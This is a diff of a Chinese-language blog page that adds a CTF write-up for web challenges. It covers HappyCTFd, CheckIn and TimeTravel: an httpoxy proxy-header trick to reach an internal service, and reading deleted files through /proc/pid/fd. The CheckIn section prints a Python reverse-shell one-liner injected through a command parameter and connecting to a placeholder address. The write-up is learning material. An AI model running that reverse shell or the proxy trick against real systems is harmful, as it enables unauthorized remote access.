@@ -14,7 +14,7 @@
     <meta name="description" content="Programming">
     <meta name="author" content="Haojen Lau">
     <meta name="keywords" content>
-    <title>Archives ~ w366er</title>
+    <title>V&amp;N_内部考核_wp ~ w366er</title>
     <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css?v=5.7.2">
     <link rel="stylesheet" href="/lib/mdbootstrap/css/bootstrap.min.css?v=4.3.1">
     <link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css?v=4.8.7">
@@ -31,7 +31,7 @@
 
 
 <body>
-<header style="height: 80vh;">
+<header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
 <div class="container">
     <a class="navbar-brand" href="/">&nbsp;<strong>w366er</strong>&nbsp;</a>
@@ -72,13 +72,16 @@
 
 </nav>
     <div class="view intro-2"
-         style="background: url('/img/archive.jpg')no-repeat center center;background-size: cover;">
+         style="background: url('/img/post.jpg')no-repeat center center;background-size: cover;">
         <div class="full-bg-img">
             <div class="mask rgba-black-light flex-center">
                 <div class="container text-center white-text wow fadeInUp">
                     <span class="h2" id="subtitle">
                         
                     </span>
+                    
+                        <br>
+                        <p>星期三, 三月 4日 2020, 10:41 上午</p>
                     
                 </div>
             </div>
@@ -88,40 +91,79 @@
 
 <main>
     
-        <div class="container nopadding-md">
-            <div class="py-5 z-depth-3 board">
-                
-                <div class="container">
-                    <div class="row">
-                        <div class="col-12 col-md-10 m-auto">
+        
+
+<div class="container-fluid">
+    <div class="row">
+        <div class="d-none d-lg-block col-lg-2"></div>
+            <div class="col-lg-8 nopadding-md">
+                <div class="py-5 z-depth-3 board">
+                    <div class="post-content mx-auto">
+                        <div class="markdown-body">
+                            <h1 id="WEB-部分"><a href="#WEB-部分" class="headerlink" title="WEB 部分"></a>WEB 部分</h1><h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>有一说一，一步一步按照这个做：<br><strong><a href="https://www.colabug.com/2020/0204/6940556/amp/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/amp/</a></strong></p>
+<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>比赛的时候没有打出来，但是留个坑吧，顺便学习一下反弹 shell。</p>
+<pre><code>shell?c=python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip_address&quot;,ip_port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre><p>这道题最重要的知识点这个。</p>
+<p><img src="/images/V&N/file_open.png" alt></p>
+<p>Linux 中 /proc/pid/fd/ 下的 descriptor 文件会指向某个对应正在打开的文件。所以这里离<br>虽然执行了 rm 操作，但是也可以通过 descriptor 来读取文件 content。</p>
+<h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>这里比赛的时候没有去看，但是复现之后觉得还是有点意思的。</p>
+<p><strong>步骤</strong></p>
+<p>一、</p>
+<p>首先先看看这篇文章： <a href="https://httpoxy.org/" target="_blank" rel="noopener">HTTPPROXY</a><br>因为这里 use GuzzleHttp\Client，Guzzle 使用的是 RFC 3875 (CGI)。</p>
+<p><img src="/images/V&N/CGI.png" alt></p>
+<p>意思是这个规则会将 header 中的 proxy 参数设置成环境变量 HTTP_PROXY。</p>
+<p>影响范围：<br><img src="/images/V&N/scale.png" alt></p>
+<p>二、</p>
+<p>传入 flag 参数，利用上面的方法，我们可以使用内网 ip 代理，手动设置 5000端口的内容，最后 readflag。</p>
+<p>设置 proxy。（注意使用内网地址，比赛方规定，没办法）</p>
+<p><img src="/images/V&N/set_proxy.png" alt></p>
+<p>写入 json_encoded 之后的内容。</p>
+<p><img src="/images/V&N/write_json.png" alt></p>
+<p>三、</p>
+<p>一开始做到这里我就迷惑了，于是看到某位大佬的博客：</p>
+<p><strong><a href="https://www.cnblogs.com/20175211lyz/p/12398612.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/12398612.html</a></strong></p>
+<p>使用 php -c 0:5000 语句。</p>
+<p><img src="/images/V&N/start_php.png" alt></p>
+<p>带着 Proxy 去访问，成功了，flag 到手。</p>
+<p><img src="/images/V&N/response_php.png" alt></p>
+
+                            <hr>
+                        </div>
+                        <br>
+                        <div>
                             
-
-<div class="list-group">
-    <p class="h4">Total: 11</p>
-    <hr>
-    
-        
-            
-            <p class="h5">2019</p>
-        
-        <a href="/2019/08/29/about-today/" class="list-group-item list-group-item-action">
-            <span class="archive-post-title">Writing Example</span>
-            <span style="float: right;">08-29</span>
-        </a>
-    
-        
-        <a href="/2019/08/27/hello-world/" class="list-group-item list-group-item-action">
-            <span class="archive-post-title">Hello World</span>
-            <span style="float: right;">08-27</span>
-        </a>
-    
-</div>
-
+                            <p>
+                                <i class="iconfont icon-tag"></i>
+                                
+                                    <a class="hover-with-bg" href="/tags/wp">wp</a>
+                                
+                            </p>
+                            
+                                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+                            
                         </div>
                     </div>
                 </div>
             </div>
+        <div class="d-none d-lg-block col-lg-2 toc-container">
+            
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
         </div>
+    </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+    <div class="container comments mx-auto" id="comments">
+        
+    </div>
+</div>
     
 </main>
 
@@ -143,6 +185,11 @@
   <script src="/lib/nprogress/nprogress.min.js?v=0.2.0"></script>
   <script src="/js/main.js"></script>
   
+    
+      <script src="/lib/tocbot/tocbot.min.js?v=4.7.0"></script>
+    
+    <script src="/js/post.js"></script>
+  
   
     <script src="/lib/prettify/prettify.min.js?v=0.1.0"></script>
     <script>
@@ -158,7 +205,7 @@
         var typed = new Typed('#subtitle', {
           strings: [
             '  ',
-            "Archives&nbsp;",
+            "V&N_内部考核_wp&nbsp;",
         ],
         cursorChar: "|",
         typeSpeed: 90,
